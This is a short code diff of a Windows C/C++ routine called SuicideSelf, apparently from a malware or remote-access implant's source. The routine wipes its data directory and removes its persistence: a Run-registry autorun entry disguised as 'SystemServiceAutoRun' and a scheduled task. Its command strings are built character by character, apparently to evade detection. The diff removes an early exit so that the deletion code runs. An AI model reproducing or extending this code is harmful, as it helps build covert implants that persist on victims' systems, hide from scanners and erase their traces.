@@ -16,7 +16,7 @@ int __stdcall SuicideSelf() {
 	HANDLE hf = lpCreateFileA((char*)fn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
 	if (hf == INVALID_HANDLE_VALUE)
 	{
-		return FALSE;
+		//return FALSE;
 	}
 
 	DWORD dwcnt = 0;
@@ -36,8 +36,6 @@ int __stdcall SuicideSelf() {
 	}
 
 	lpCloseHandle(hf);
-	ExitProcess(0);
-	return TRUE;
 
 	int iRet = 0;
 	iRet = DeleteAllFilesInDir(strDataPath);
@@ -47,6 +45,8 @@ int __stdcall SuicideSelf() {
 		'/','v',' ','S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',' ','/','f',' ',0 };
 	// 		char szDeleteKeyCU[] = "reg delete HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\ /v systemserviceautorun";
 	// 		char szDeleteKeyLM[] = "reg delete HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\ /v systemserviceautorun";
+	char key[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',0 };
+
 	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
 	{
 		char szDeleteTaskFormat[] = { 's','c','h','t','a','s','k','s',' ','/','d','e','l','e','t','e',' ','/','f',' ','/','t','n',' ','%','s',0 };
